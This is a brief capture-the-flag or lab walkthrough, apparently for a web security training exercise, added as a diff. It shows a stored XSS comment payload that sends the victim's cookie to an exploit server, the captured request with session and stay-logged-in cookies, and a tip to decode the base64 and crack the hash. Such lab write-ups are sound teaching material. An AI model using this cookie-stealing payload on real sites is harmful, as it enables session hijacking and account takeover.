@@ -1,0 +1,14 @@
+
+
+you see cookie is stored in storage and site is vulnerable to xss
+so redirect to attacker server with cookie whit this payload in commants
+
+
+<script>document.location='https://exploit-0ab500720427acc38181dde701b3004d.exploit-server.net/'+document.cookie</script>
+
+and recive this :
+
+"GET /secret=pkXubpp0bC2HVA1bc4ZcSD5osbhs37c4;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1"
+
+
+so decode base64 and crack hash you can pass this level ;)
